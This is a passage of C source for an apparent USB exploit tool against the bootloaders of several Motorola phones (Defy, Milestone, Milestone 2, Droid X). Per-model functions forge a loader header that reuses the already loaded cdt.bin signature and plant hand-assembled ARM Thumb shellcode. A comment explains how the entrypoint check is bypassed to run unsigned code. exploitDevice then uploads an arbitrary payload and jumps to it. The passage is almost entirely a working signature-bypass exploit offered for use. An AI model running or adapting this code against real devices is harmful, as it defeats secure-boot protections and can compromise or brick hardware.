    hdr->magic = 0xB17219E9; // hardcoded magic
    hdr->public_key = 0x8F311290; // Let's use the public key inside the mbm
    hdr->signature = 0x82001000; // signature, range chacked
    hdr->fuse_level = 1;

    memcpy(&buff[0x1000], cdt_signature_ms, sizeof(cdt_signature_ms));

    uint8_t callmemcpy[] = {
        //MOV LR, 1
        0x4F, 0xF0, 0x01, 0x0E,
        //MOVT LR, 0x8200
        0xC8, 0xF2, 0x00, 0x2E,
        //MOV R0, 0x2000
        0x42, 0xF2, 0x00, 0x00,
        //MOVT R0, 0x8200
        0xC8, 0xF2, 0x00, 0x20,
        //MOV R1, 0
        0x4F, 0xF0, 0x00, 0x01,
        //MOVT R1, 0x8200
        0xC8, 0xF2, 0x00, 0x21,
        //MOV R2, 0
        0x4F, 0xF0, 0x00, 0x02,
        //MOVT R2, 0x0004
        0xC0, 0xF2, 0x04, 0x02,
        //MOV R3, 0xB478
        0x4B, 0xF2, 0x78, 0x43,
        //MOVT R3, 0x8F31
        0xC8, 0xF6, 0x31, 0x73,
        //BX R3
        0x18, 0x47,
    };

    memcpy(&buff[0xED0], callmemcpy, sizeof(callmemcpy));
}

void genPayloadMS2_1270(uint8_t* buff)
{
    ramldr* hdr = (ramldr*)buff;

    hdr->entrypoint = 0x82001155; // entry point, range chacked
    hdr->magic = 0xB17219E9; // hardcoded magic
    hdr->public_key = 0x89311290; // Let's use the public key inside the mbm
    hdr->signature = 0x82001000; // signature, range chacked

    memcpy(&buff[0x1000], cdt_signature_ms2, sizeof(cdt_signature_ms2));

    uint8_t callmemcpy[] = {
        //MOV LR, 1
        0x4F, 0xF0, 0x01, 0x0E,
        //MOVT LR, 0x8200
        0xC8, 0xF2, 0x00, 0x2E,
        //MOV R0, 0x2000
        0x42, 0xF2, 0x00, 0x00,
        //MOVT R0, 0x8200
        0xC8, 0xF2, 0x00, 0x20,
        //MOV R1, 0
        0x4F, 0xF0, 0x00, 0x01,
        //MOVT R1, 0x8200
        0xC8, 0xF2, 0x00, 0x21,
        //MOV R2, 0
        0x4F, 0xF0, 0x00, 0x02,
        //MOVT R2, 0x0004
        0xC0, 0xF2, 0x04, 0x02,
        //MOV R3, 0xB4AC
        0x4B, 0xF2, 0xAC, 0x43,
        //MOVT R3, 0x8931
        0xC8, 0xF6, 0x31, 0x13,
        //BX R3
        0x18, 0x47,
    };

    memcpy(&buff[0xAAC], callmemcpy, sizeof(callmemcpy));
}

void genPayloadMS2_1370(uint8_t *buff)
{
    ramldr* hdr = (ramldr*)buff;

    hdr->entrypoint = 0x82001155; // entry point, range chacked
    hdr->magic = 0xB17219E9; // hardcoded magic
    hdr->public_key = 0x89311290; // Let's use the public key inside the mbm
    hdr->signature = 0x82001000; // signature, range chacked

    memcpy(&buff[0x1000], cdt_signature_ms2, sizeof(cdt_signature_ms2));

    uint8_t callmemcpy[] = {
        //MOV LR, 1
        0x4F, 0xF0, 0x01, 0x0E,
        //MOVT LR, 0x8200
        0xC8, 0xF2, 0x00, 0x2E,
        //MOV R0, 0x2000
        0x42, 0xF2, 0x00, 0x00,
        //MOVT R0, 0x8200
        0xC8, 0xF2, 0x00, 0x20,
        //MOV R1, 0
        0x4F, 0xF0, 0x00, 0x01,
        //MOVT R1, 0x8200
        0xC8, 0xF2, 0x00, 0x21,
        //MOV R2, 0
        0x4F, 0xF0, 0x00, 0x02,
        //MOVT R2, 0x0004
        0xC0, 0xF2, 0x04, 0x02,
        //MOV R3, 0xB494
        0x4B, 0xF2, 0x94, 0x43,
        //MOVT R3, 0x8931
        0xC8, 0xF6, 0x31, 0x13,
        //BX R3
        0x18, 0x47,
    };

    memcpy(&buff[0xAAC], callmemcpy, sizeof(callmemcpy));
}

void genPayloadDroidX(uint8_t* buff)
{
    ramldr* hdr = (ramldr*)buff;

    hdr->entrypoint = 0x820010FF; // entry point, range chacked
    hdr->magic = 0xB17219E9; // hardcoded magic
    hdr->public_key = 0x89311290; // Let's use the public key inside the mbm
    hdr->signature = 0x82001000; // signature, range chacked
    hdr->fuse_level = 2;

    memcpy(&buff[0x1000], cdt_signature_dx, sizeof(cdt_signature_dx));

    uint8_t callmemcpy[] = {
        //MOV LR, 1
        0x4F, 0xF0, 0x01, 0x0E,
        //MOVT LR, 0x8200
        0xC8, 0xF2, 0x00, 0x2E,
        //MOV R0, 0x2000
        0x42, 0xF2, 0x00, 0x00,
        //MOVT R0, 0x8200
        0xC8, 0xF2, 0x00, 0x20,
        //MOV R1, 0
        0x4F, 0xF0, 0x00, 0x01,
        //MOVT R1, 0x8200
        0xC8, 0xF2, 0x00, 0x21,
        //MOV R2, 0
        0x4F, 0xF0, 0x00, 0x02,
        //MOVT R2, 0x0004
        0xC0, 0xF2, 0x04, 0x02,
        //MOV R3, 0xB998
        0x4B, 0xF6, 0x98, 0x13,
        //MOVT R3, 0x8931
        0xC8, 0xF6, 0x31, 0x13,
        //BX R3
        0x18, 0x47,
    };

    memcpy(&buff[0xB96], callmemcpy, sizeof(callmemcpy));
}

void exploitDevice(usb_dev_handle* dev, char *payloadPath)
{
    if (usb_claim_interface(dev, 0) < 0)
    {
        printf("error claiming interface %s\n", usb_strerror());
        return;
    }
    else
    {
        printf("success: claim_interface\n");
    }

    uint16_t bootloader_version = rqvn(dev);

    printf("bootloader_version: %x\n", bootloader_version);

    /*
        The exploit:
         - Nothing checks if the entrypoint is signed or not.
         - There are two checks on it:
            - it has to point inside the ramldr buffer 0x82000000 - 0x8204CFFF
            - that it has to point to an address that is signature checked
         - The signatures adds themself to checked list (Why ?)
         - The cdt.bin is loaded to the memory and untuched
         - If we use the already loaded cdt.bin's signature it will pass the signature check
         - If we point the entrypoint inside the signature it will pass the range check
         - On 0x820001AB we have a 'B 0x8200050E', we call that and run our unsigned code
    */

    uint8_t buff[0x2000];
    memset(buff, 0, sizeof(buff));

    if (bootloader_version == 0x1009) // Defy
        genPayloadDefy(buff);
    else if (bootloader_version == 0x20A0) // Milestone
        genPayloadMS(buff);
    else if (bootloader_version == 0x1270) // Milestone 2
        genPayloadMS2_1270(buff);
    else if (bootloader_version == 0x1370) // Milestone 2
        genPayloadMS2_1370(buff);
    else if (bootloader_version == 0x0430) // Droid X
        genPayloadDroidX(buff);
    else
        printf("Unknown bootloader!\n");

#if 0
    {
        FILE* f = fopen("payload.bin", "wb");
        fwrite(buff, 1, sizeof(buff), f);
        fclose(f);
    }
#endif

    addr(dev, 0x82000000);
    bin(dev, buff, sizeof(buff));

    FILE* f = fopen(payloadPath, "rb");
    int len;
    uint8_t payload[0x2000];
    uint32_t ptr = 0x82002000;
    while (len = fread(payload, 1, sizeof(payload), f))
    {
        addr(dev, ptr);
        bin(dev, payload, len);
        ptr += len;
    }
    fclose(f);

    rqrc(dev, 0x82000000, 0x8204CFFF);

    jump(dev);

    usb_release_interface(dev, 0);

    printf("Done.\n");
}

int main(int argc, char ** argv)
{
    if (argc != 2)
    {
        printf("usage: %s <payload>\n", argv[0]);
        return 0;
    }

	usb_init();
	usb_find_busses();
	usb_find_devices();

    for (struct usb_bus *bus = usb_get_busses(); bus; bus = bus->next)
    {
        for (struct usb_device *dev = bus->devices; dev; dev = dev->next)
        {
            if (dev->descriptor.idVendor == VID_MOTOROLA
                && (dev->descriptor.idProduct == PID_OMAP34XX || dev->descriptor.idProduct == PID_OMAP36XX))
            {
                usb_dev_handle* devh = usb_open(dev);

                exploitDevice(devh, argv[1]);

                usb_close(devh);
            }
        }
    }

    return 0;
}
